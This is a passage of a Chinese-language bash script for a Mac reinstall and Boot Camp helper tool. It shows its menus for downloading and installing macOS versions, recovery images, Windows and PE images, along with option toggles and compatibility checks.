if [[ $modelxh = "10.11"* ]]; then
dqzgmac="当前系统最高直接升级：12.X"
fi
fi
if [ ! "$qkmac" ]; then
qkmacc="关"
else
qkmacc="开"
if [ "$kykj" -lt "33" ]; then
echo
read -s -n1 -p "注意：剩余空间小于33G, 按任意键继续..."
fi
fi
if [ ! "$appmac" ]; then
appmacc="关"
else
appmacc="开"
fi
if [ ! "$bazmac" ]; then
bazmacc="关"
else
bazmacc="开"
fi
echo "空间：${Disk}" 
echo "    ______________________       "$drvmac"MacOs      ____________________"
echo "   |                        --------------------                    |"
if [ "$upazmac" ]; then
echo "   |   \033[35m[L]\033[0m [10.7.5] OS X Lion                   \033[35m[11]\033[0m 10.7恢复环境   |"
echo "   |                                                                |"
fi
echo "   |   \033[35m[1]\033[0m [10.10.5] Yosemite                                       |"
echo "   |                                                                |"
echo "   |   \033[35m[2]\033[0m [10.11.6] El Capitan                                     |"
echo "   |                                                                |"
echo "   |   \033[35m[3]\033[0m [10.12.6] macOS Sierra                                   |"
echo "   |                                                                |"
echo "   |   \033[35m[4]\033[0m [10.13.6] High Sierra                \033[35m[13]\033[0m 10.13恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[5]\033[0m [10.14.6] Mojave                     \033[35m[14]\033[0m 10.14恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[6]\033[0m [10.15.7] Catalina                   \033[35m[15]\033[0m 10.15恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[7]\033[0m [11.7.2] Big Sur                     \033[35m[16]\033[0m 11.xx恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[8]\033[0m [12.6.0] Monterey                    \033[35m[17]\033[0m 12.xx恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[9]\033[0m [13.2.0] Ventura                     \033[35m[18]\033[0m 13.xx恢复环境  |"
echo "   |                                                                |"
echo "   |   \033[35m[Z]\033[0m [14.0.0] Sonoma                      \033[35m[19]\033[0m 14.xx恢复环境  |"
echo "   |                                                                |"
if [ "$drvmac" = "安装" ]; then
echo "   |   \033[35m[Q]\033[0m 升级并清空："$qkmacc"       \033[35m[D]\033[0m 分区并写入："$fqmacc"                  |"
echo "   |                                                                |"
fi
if [ ! "$upazmac" ]; then
echo "   |   \033[35m[A]\033[0m APP升级安装："$appmacc"      \033[35m[J]\033[0m 仅下载不安装："$bazmacc"                |"
echo "   |                                                                |"
fi
echo "   |   \033[35m[x]\033[0m 返回                 \033[35m[K]\033[0m 强升10.15.7                     |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo "       当前机型最高兼容："$zgmac"       "$dqzgmac""
echo
echo
read -p "_______请输入:" num
echo
case "$num" in
    l)
    if [ "$upazmac" ] ;then
    name="10.7.5.dmg"
	url="$ip8/Os/10.7.5.dmg"
	AZPKG
	fi
	if [ "$appmac" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "此版本无法APP升级！"
    SJZGMAC	
	fi
	SJZGMAC
	;;
	k)
    if [ ! "$kyqs15" ] ;then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前机型不可以强升！"
    SJZGMAC	
	fi
	if [ "$zgmac" = "10.13" ]; then
	if [[ $modelxh != "10.13"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前机型官方支持10.13，需先升级10.13"
    SJZGMAC	
	fi
	fi
    if [ "$sip" ]; then
    clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "请先关闭SIP！！！"
    SJZGMAC	
    fi
	qs15="1"
	name="USB.Flash.Install.macOS.Catalina.10.15.7.02.19H2.dmg"
	url="$ip8/Os/10.15.7.dmg"
	SourceMD5="9d5d419e73555f98dfa42c723f61eb7e"
	name2="QS15.dmg"
	url2="$ip8/Os/QS15.dmg"
	SourceMD52="aecde2e165610b3b7642ec94f8df07a7"
	Download
	;;
    j)
    if [ ! "$bazmac" ]; then
	bazmac="1"
	SJZGMAC
	fi
	if [ "$bazmac" = "1" ]; then
	bazmac=""
	SJZGMAC
	fi
	;;
    a)
    if [ ! "$appmac" ]; then
	appmac="1"
	SJZGMAC
	fi
	if [ "$appmac" = "1" ]; then
	appmac=""
	SJZGMAC
	fi
	;;
    d)
    if [ ! "$fqmac" ]; then
	fqmac="1"
	SJZGMAC
	fi
	if [ "$fqmac" = "1" ]; then
	fqmac=""
	SJZGMAC
	fi
	;;
    q)
    if [ "$fqmac" ]; then
    clear && printf "\e[3J"
    echo
    read -s -n1 -p "已开启分区安装模式！！！"
    SJZGMAC
    fi
    if [ ! "$apfsfq" ] ; then
    clear && printf "\e[3J"
    read -s -n1 -p "不是APFS分区，无法自动清空，请分区手动安装"
    SJZGMAC
    fi
    if [ ! "$qkmac" ]; then
	qkmac="1"
	SJZGMAC
	fi
	if [ "$qkmac" = "1" ]; then
	qkmac=""
	SJZGMAC
	fi
	;;
	11)
	name="hf10.7.dmg"
	url="$ip8/Os/hf10.7.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
    SJZGMAC
	;;
	13)
	name="hf10.13.dmg"
	url="http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi 
	Download
	;;
	14)
	name="hf10.14.dmg"
	url="http://swcdn.apple.com/content/downloads/17/32/061-26589-A_8GJTCGY9PC/25fhcu905eta7wau7aoafu8rvdm7k1j4el/BaseSystem.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi
	Download
	;;
	15)
	name="hf10.15.dmg"
	url="http://swcdn.apple.com/content/downloads/61/24/001-57224/0o1xetys5n505gocjsil5qo0p4kg939elb/BaseSystem.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi
	Download
	;;
	16)
	name="hf11.0.dmg"
	url="$ip8/Os/hf11.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi
	Download
	;;
	17)
	name="hf12.0.dmg"
	url="$ip8/Os/hf12.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi
	Download
	;;
	18)
	name="hf13.0.dmg"
	url="$ip8/Os/hf13.dmg"
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$azmac" ] ;then
	azmac5g	
	AZPKG
	fi
	Download
	;;
    1)
    if [ "$upazmac" ] ;then
    name="10.10.5.dmg"
	url="$ip8/Os/10.10.5.dmg"
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.10，请制作U盘、本地PE"
    SJZGMAC
	fi
	if [ "$appmac" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "此版本无法APP升级！"
    SJZGMAC	
	fi
    name="InstallMacOSX.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-41343-20191023-02465f92-3ab5-4c92-bfe2-b725447a070d/InstallMacOSX.dmg" 
	SourceMD5="" 
    wzbsjmac="10.10"
	AZPKG
	;;
    2)
    name="10.11.6.dmg"
	url="$ip8/Os/10.11.6.dmg"
	SourceMD5=""
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi    
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.11，请制作U盘、本地PE"
    SJZGMAC
	fi	
	if [ "$appmac" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "此版本无法APP升级！"
    SJZGMAC	
	fi	
	if [ "$azmac" ] ;then
	AZPKG
	fi    
    name="InstallMacOSX.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-41424-20191024-218af9ec-cf50-4516-9011-228c78eda3d2/InstallMacOSX.dmg"
	SourceMD5=""
    wzbsjmac="10.11"
	AZPKG
	;;
	3)
	name="USB.Flash.Install.macOS.Sierra.10.12.6.dmg"
	url="$ip8/Os/10.12.6.dmg"
	SourceMD5="a6b08dd7cd6839ea052cc03dede3cfcb"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$apfsfq" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "当前系统版本无法本地降级10.12，请制作U盘、本地PE"
    SJZGMAC
	fi	
	if [ "$appmac" ]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "此版本无法APP升级！"
    SJZGMAC	
	fi	
	if [ "$azmac" ] ;then
	AZPKG
	fi
	name="InstallOS.dmg"
	url="http://updates-http.cdn-apple.com/2019/cert/061-39476-20191023-48f365f4-0015-4c41-9f44-39d3d2aca067/InstallOS.dmg"
	SourceMD5=""
	wzbsjmac="10.12"
	AZPKG
	;;
	4)
	if [ "$qkmac" = "1" ]; then
	if [[ $modelxh = "10.14"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	if [[ $modelxh = "10.15"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi			
	if [[ $modelxh = "11."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi	
	if [[ $modelxh = "12."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	fi
	name="USB.Flash.Install.macOS.High.Sierra.10.13.6.02.v2n.dmg"
	url="$ip8/Os/10.13.6.dmg"
	SourceMD5="6660b64c1d32989c01c2b1e05a0edd9d"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app10.13.zip"
	url="$ip5/app10.13.zip"
	CustomizeURL="sj10.13"
	Download	
	fi
	if [ "$azmac" ] ;then
	AZPKG
	fi
	wzbsjmac="10.13"
	AZPKG
	;;
	5)
	if [ "$qkmac" = "1" ]; then
	if [[ $modelxh = "10.15"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi			
	if [[ $modelxh = "11."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi	
	if [[ $modelxh = "12."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	fi	
	name="USB.Flash.Install.macOS.Mojave.10.14.6.06.v2s.dmg"
	url="$ip8/Os/10.14.6.dmg"
	SourceMD5="d214016fd32f6f3292901cc444e152d9"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$zgmac" = "10.13" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.13.6"
	SJZGMAC
	fi
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app10.14.zip"
	url="$ip5/app10.14.zip"
	CustomizeURL="sj10.14"
	Download	
	fi
	if [ "$azmac" ] ;then
	AZPKG
	fi
	wzbsjmac="10.14"
	AZPKG
	;;
	6)
	if [ "$qkmac" = "1" ]; then			
	if [[ $modelxh = "11."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi	
	if [[ $modelxh = "12."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	fi	
	name="USB.Flash.Install.macOS.Catalina.10.15.7.02.19H2.dmg"
	url="$ip8/Os/10.15.7.dmg"
	SourceMD5="9d5d419e73555f98dfa42c723f61eb7e"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$zgmac" = "10.13" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.13.6"
	SJZGMAC
	fi	
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app10.15.zip"
	url="$ip5/app10.15.zip"
	CustomizeURL="sj10.15"
	Download	
	fi
	if [ "$azmac" ] ;then
	AZPKG
	fi
	wzbsjmac="10.15"
	AZPKG
	;;
	7)
	if [ "$qkmac" = "1" ]; then
	if [[ $modelxh = "11.6"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi	
	if [[ $modelxh = "11.7"* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi	
	if [[ $modelxh = "12."* ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	fi	
	#name="InstallAssistant11.pkg"
	#url="https://swcdn.apple.com/content/downloads/00/52/012-38280-A_U42U8QWY6W/xlqy3umkvwvbsjyh471ips53ux8r0jdywq/InstallAssistant.pkg"
	name="USB.Flash.Install.macOS.Big.Sur.11.7.2.20G1020.dmg"
	url="$ip8/Os/11x.dmg"
	SourceMD5="02eaad7dff006194d1e3c29f77ebc1b1"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$zgmac" = "10.13" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.13.6"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.15" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.15.7"
	SJZGMAC
	fi	
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app11.0.zip"
	url="$ip5/app11.0.zip"
	CustomizeURL="sj11.0"
	Download	
	fi
	if [ "$azmac" ] ;then
	AZPKG
	fi
	wzbsjmac="11.0"
	AZPKG
	;;
	8)
	if [ "$qkmac" = "1" ]; then
	if [[ $modelxh = "12.6.1" ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	if [[ $modelxh = "12.6.2" ]]; then
	clear && printf "\e[3J"
	echo
	echo
    read -s -n1 -p "无法直接降级清空，请分区安装！！！"
    SJZGMAC
	fi
	fi	
	#name="InstallAssistant12.pkg"
	#url="https://swcdn.apple.com/content/downloads/03/23/012-40494-A_LYJ5GAY6QK/8iswu187h4yn4os8rq1gzt2ey1aasgemsw/InstallAssistant.pkg"
	name="USB.Flash.Install.macOS.Monterey.v12.6.Y1.dmg"
	url="$ip8/Os/12x.dmg"
	SourceMD5="bbc07a1fa84d1c44e67e5f2ce61657f0"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$zgmac" = "10.13" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.13.6"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.15" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.15.7"
	SJZGMAC
	fi	
	if [ "$zgmac" = "11.0" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容11.X"
	SJZGMAC
	fi		
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app12.0.zip"
	url="$ip5/app12.0.zip"
	CustomizeURL="sj12.0"
	Download	
	fi
	if [ "$azmac" ] ;then
	AZPKG
	fi
	wzbsjmac="12.0"
	AZPKG
	;;
	9)
	#name="InstallAssistant13.pkg"
	#url="https://swcdn.apple.com/content/downloads/30/37/012-60271-A_QUUGE8KIJ8/yp0xtj55orcpxszdtd13xjhujppspsztj3/InstallAssistant.pkg"
    name="USB.Flash.Install.macOS.Ventura.v13.2.J5.dmg"
	url="$ip8/Os/13x.dmg"
	SourceMD5="2ab33119c6d2e7b78d23508dcc10598c"
	if [ "$bazmac" ] ;then
	Download
	fi
	if [ "$upazmac" ] ;then
	AZPKG
	fi
	if [ "$zgmac" = "10.7" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.7.5"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.11" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.11.6"
	SJZGMAC
	fi
	if [ "$zgmac" = "10.13" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.13.6"
	SJZGMAC
	fi	
	if [ "$zgmac" = "10.15" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容10.15.7"
	SJZGMAC
	fi
	if [ "$zgmac" = "11.0" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容11.X"
	SJZGMAC
	fi
	if [ "$zgmac" = "12.0" ]; then
	clear && printf "\e[3J"
	echo
	read -s -n1 -p "选择有误，当前电脑最高兼容12.X"
	SJZGMAC
	fi	
	if [ "$appmac" ]; then
    appsj="1"
    SourceMD5=""
	name="app13.0.zip"
	url="$ip5/app13.0.zip"
	CustomizeURL="sj13.0"
	Download	
	fi	
	if [ "$azmac" ] ;then
	AZPKG
	fi	
	wzbsjmac="13.0"
	AZPKG
	;;	
	x)
	XTLB
	;;	
esac
    SJZGMAC
}


XTLB(){
clear && printf "\e[3J"
disk_total="$(df -h | head -2 | tail -1 | awk '{print $2}' | sed 's/i/B/g')[总]"
disk_used="$(df -h | head -2 | tail -1 | awk '{print $4}' | sed 's/i/B/g')[可用]"
Disk="$disk_used / $disk_total"
if [ ! "$oldusb" ]; then
jiami="$(fdesetup status | grep Encryption)"
fi
efifq="$(diskutil list disk0 | grep EFI)"
if [ ! "$efifq" ]; then
efifq="$(diskutil list disk0 | grep "NO NAME")"	
fi
azwin7=""
azwin8=""
if [ ! "$isoyh" ]; then
isoyh="关"
fi
if [ ! "$ddfq" ]; then
ddfqq="关"
fi
if [ ! "$k11pe" ]; then
kk11pe="关"
fi
if [ ! "$kzdcq" ]; then
kkzdcq="关"
fi
echo "${Disk}" 
osascript <<EOD
tell application "Terminal"
activate
set size of window 1 to {800, 650}
end tell
EOD
if [ ! "$M1CPU" ]; then
if [ ! "$efifq" ]; then
echo
diskutil list disk0
echo
read -s -n1 -p "注意：可能不存在EFI分区，请检查disk0s1分区"
echo
fi
fi
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
if [ "$sip" ]; then
echo
echo "本机机型："$dnjx"" SIP $yphdd
echo
else
echo
echo "本机机型："$dnjx"" $yphdd
echo
fi
if [ "$xkbcz" ]; then
echo
echo "注意：检测不到独立显卡，无法安装！"
echo
fi
if [ "$jiami" ]; then
echo
read -s -n1 -p "注意：磁盘正在加密中...."
open "x-apple.systempreferences:com.apple.preference.security?FDE"
echo
fi
if [ "$pcissd" ]; then
echo
echo "注意：检测到PCI转接硬盘！"
echo
fi
if [ ! "$oldusb" ]; then
if [ "$wybxsq" ]; then
echo
echo "注意：无屏幕或者非原厂屏！"
echo
fi
fi
if [ "$NoWin7" ]; then
azwin7="...."
azwin8="...."
else
azwin7="Win7"
azwin8="Win8"
fi
EFIS=""
HBFQS=""
PEDrv=""
repe=""
name=""
url=""
name2=""
url2=""
mjh7=""
soft=""
re700=""
re800=""
index=""
OsWin764=""
SourceSHA1=""
SourceMD5=""
SourceMD52=""
pnputil=""
Win11=""
drvname=""
xtname=""
xtname2=""
xnjaz=""
pd107z=""
azw11=""
azw10=""
azw7=""
isoesd=""
isoName=""
uups=""
iso7=""
HFSIP=""
azuppe=""
azbdpe=""
upazmac=""
azmac=""
azof=""
SCPD=""
SCVM=""
SCXNJ=""
CustomizeURL=""
DrvWZ=""
echo "    ________________________       System       ____________________"
echo "   |                        --------------------                    |"
echo "   |                                                                |"
echo "   |   \033[35m[1]\033[0m 1809         \033[35m[2]\033[0m 1909         \033[35m[3]\033[0m Win11                  |"
echo "   |                                                                |"
echo "   |   \033[35m[7]\033[0m "$azwin7"         \033[35m[8]\033[0m "$azwin8"         \033[35m[M]\033[0m MSDN                   |"
echo "   |                                                                |"
echo "   |   \033[35m[4]\033[0m 虚拟机       \033[35m[B]\033[0m 本地PE       \033[35m[U]\033[0m U盘PE                  |"
echo "   |                                                                |"
echo "   |   \033[35m[S]\033[0m 安装Mac      \033[35m[A]\033[0m U盘Mac       \033[35m[C]\033[0m 清理工具               |"
echo "   |                                                                |"
echo "   |   \033[35m[5]\033[0m 磁盘工具     \033[35m[6]\033[0m 转换助理     \033[35m[V]\033[0m 引导修复               |"
echo "   |                                                                |"
if [ "$wzhfxt" ]; then
echo "   |   \033[35m[9]\033[0m "$wzhfxt"         \033[35m[Y]\033[0m WinYH"$isoyh"      \033[35m[11]\033[0m "$wzhfxt"                  |"
echo "   |                                                                |"
fi
if [ "$srsyb" ]; then
if [ ! "$wzhfxt732" ]; then
if [ "$wzhfxt7" ]; then
echo "   |   \033[35m[K]\033[0m "$wzhfxt7"                                                     |"
echo "   |                                                                |"
fi
else
echo "   |   \033[35m[K]\033[0m "$wzhfxt7"         \033[35m[O]\033[0m "$wzhfxt732"                                    |"
echo "   |                                                                |"
fi
fi
echo "   |   \033[35m[G]\033[0m 指令大全     \033[35m[D]\033[0m D分区"$ddfqq"      \033[35m[Q]\033[0m 切换11PE"$kk11pe"             |"
echo "   |                                                                |"
echo "   |   \033[35m[z]\033[0m 旧版界面     \033[35m[R]\033[0m 常用软件     \033[35m[W]\033[0m 安装完自动重启"$kkzdcq"       |"
echo "   |                                                                |"
echo "   |________________________________________________________________|"
echo
echo
read -p "_______请输入:" num
echo
case "$num" in
    d)
    if [ ! "$apfsfq" ]; then  
    if [ "$MBR10" ]; then  
    REHD="$(diskutil list | grep Apple_Boot)"
    if [ "$REHD" ]; then  
    clear && printf "\e[3J"
    echo
    echo
    read -s -n1 -p "请先关闭SIP！！！再删除恢复分区！！！"
    XTLB
    fi
    fi
    fi
    if [ "$sip" ]; then  
    if [[ $modelxh = "10.11"* ]]; then
    clear && printf "\e[3J"
    echo
    echo
    read -s -n1 -p "请先关闭SIP！！！"
    XTLB
    fi
    if [[ $modelxh = "10.12"* ]]; then
    clear && printf "\e[3J"
    echo
    echo
    read -s -n1 -p "请先关闭SIP！！！"
    XTLB
    fi
    fi
	if [[ "$ddfqq" = "关" ]]; then
	ddfqq="开"
	ddfq="1"
	XTLB
	fi
	if [[ "$ddfqq" = "开" ]]; then
	ddfqq="关"
	ddfq=""
	XTLB
	fi
	;;
    y)
	if [[ "$isoyh" = "关" ]]; then
	isoyh="开"
	xtyh="1"
	XTLB
	fi
	if [[ "$isoyh" = "开" ]]; then
	isoyh="关"
	xtyh=""
	XTLB
	fi
	;;
	q)
	if [[ "$kk11pe" = "关" ]]; then
	k11pe="1"
	kk11pe="开"
	XTLB
	fi
	if [[ "$kk11pe" = "开" ]]; then
	k11pe=""
	kk11pe="关"
	XTLB
	fi
	;;
	w)
	if [[ "$kkzdcq" = "关" ]]; then
	
	
	
	
	if [ "$sip" ]; then 
	osascript <<EOD
tell application "System Events"
 set position of first window of application process "Terminal" to {150, 150}
end tell
EOD
    if [ $? -eq 1 ] ; then
    clear && printf "\e[3J"
    echo
    echo
    if [ "$pass" ]; then
    echo "$pass" | tr -d '\n' | pbcopy	
    fi
    osascript -e 'quit app"System Settings"'
    osascript -e 'quit app"System Preferences"'
    open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility"
    read -s -n1 -p "请打开【终端】辅助功能权限！"
    XTLB
    fi
    if [ $? -eq 0 ] ; then
    zdzdcq="1"	
    kzdcq="1"
	kkzdcq="开"
	XTLB
    fi
	fi
	
	
	if [ "$sip" ]; then 
	clear && printf "\e[3J"
    echo
    echo  
    read -s -n1 -p "安装完自动进入Windows，需关闭SIP！"
    XTLB 	
	fi
	kzdcq="1"
	kkzdcq="开"
	XTLB
	fi
	if [[ "$kkzdcq" = "开" ]]; then
	kzdcq=""
	kkzdcq="关"
	XTLB
	fi
	;;
    g)
    fhxtlb="1"
    AZPKG
    ;;
    r)
    Macsoft
    ;;
    v)
    if [ "$MBR10" ]; then 
    if [ "$sip" ]; then 
    clear && printf "\e[3J"
    echo
    echo
    read -s -n1 -p "此机型，请先关闭SIP！！！"
    XTLB    
    fi
    fi
    ydxf="1"
    AZPKG
    ;;
    c)
    name="CMM.dmg"
    xtname="CMM.dmg"
	url="$ip8/666/CMM.dmg"
	SourceSHA1="1d9ae29dca11e3722f51609b3035bc1d283a260b"
	Download
	;;
    9)
    CustomizeURL="6136"
	XTLB2
	;;
	11)
    CustomizeURL="116136"
	XTLB2
	;;
	k)
    CustomizeURL="4033"
	XTLB2
	;;
	o)
    CustomizeURL="4036"
	XTLB2
	;;
    1)
    CustomizeURL="SysDrv"
    Sys="1809"
	XTLB2
	;;
	2)
	CustomizeURL="SysDrv"
    Sys="1909"
	XTLB2
	;;
	3)
	CustomizeURL="SysDrv"
    Sys="Win11"
	XTLB2
	;;
	4)
    Virtual
	;;
	5)
    open /System/Applications/Utilities/Disk\ Utility.app 	
    open /Applications/Utilities/Disk\ Utility.app
    XTLB
	;;
	6)
	open /System/Applications/Utilities/Boot\ Camp\ Assistant.app
    open /Applications/Utilities/Boot\ Camp\ Assistant.app
    XTLB
	;;
	7)
    CustomizeURL="700"
	XTLB2
	;;
	8)
clear && printf "\e[3J"
read -p "正在安装Win8系统，确认无误，输入 Y 回车：" scxzw
if [ "$scxzw" = "y" ]; then    
CustomizeURL="800"
XTLB2
fi
if [ "$scxzw" = "Y" ]; then    
CustomizeURL="800"
XTLB2
fi
XTLB
	;;
	m)
	MSDN
	;;
	b)
	azbdpe="1"
	name="10pe.iso"
	url="$ip8/666/10PE.iso"
	SourceMD5="9f51660137ae054cdb07f88386b6bcbc"
	if [ "$k11pe" ]; then 
	name="11pe.iso"
	url="$ip8/666/11PE.iso"
	SourceMD5="41cb878e8d2b03f1cd481988e937535e"
	fi	
	AZPKG
	;;
	u)
	azuppe="1"
	name="10pe.iso"
	url="$ip8/666/10PE.iso"
	SourceMD5="9f51660137ae054cdb07f88386b6bcbc"
	if [ "$k11pe" ]; then 
	name="11pe.iso"
	url="$ip8/666/11PE.iso"
	SourceMD5="41cb878e8d2b03f1cd481988e937535e"
	fi
	AZPKG
	;;
	s)
	drvmac="安装"
	SJZGMAC
	;;
	a)
	upazmac="1"
	drvmac="制作"
	SJZGMAC
	;;
	0)
	jbjm="1"
	Start_menu
	;;
	z)
	jbjm="1"
	Customize
	;;
	x)
	jbjm="1"
	Start_menu
	;;
esac
    XTLB
}


XTLB2(){


